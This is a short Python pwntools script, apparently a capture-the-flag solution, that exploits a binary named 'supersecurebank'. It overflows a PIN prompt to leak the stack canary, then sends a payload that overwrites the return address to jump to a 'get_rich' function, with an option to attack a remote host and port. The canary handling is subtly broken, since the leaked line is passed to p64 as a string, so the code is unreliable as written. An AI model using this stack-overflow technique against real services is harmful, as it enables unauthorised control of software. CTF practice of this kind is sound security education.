from pwn import *

elf = context.binary = ELF('./supersecurebank')
context.terminal = ['tmux', 'splitw', '-h']
if args.REMOTE:
    conn = remote("10.45.1.2", 54323)
elif args.GDB:
    conn = gdb.debug([elf.path], gdbscript='''
    b menu
    c
    ''')
else:
    conn = elf.process()


win = elf.sym["get_rich"]
print(win)

conn.recvuntil(b'ce:')
conn.sendline(b'1')
conn.recvuntil(b'15):')
conn.sendline(b'10')
conn.recvuntil(b'pin:') 
conn.sendline(b'9'*40) 
conn.recvuntil(b'9')
possibile_canary = str(conn.recvline())
print(possibile_canary)
conn.recvuntil(b'name:')
conn.sendline(b'a' + p64(possibile_canary) + b'a'*8 + p64(win))

conn.interactive()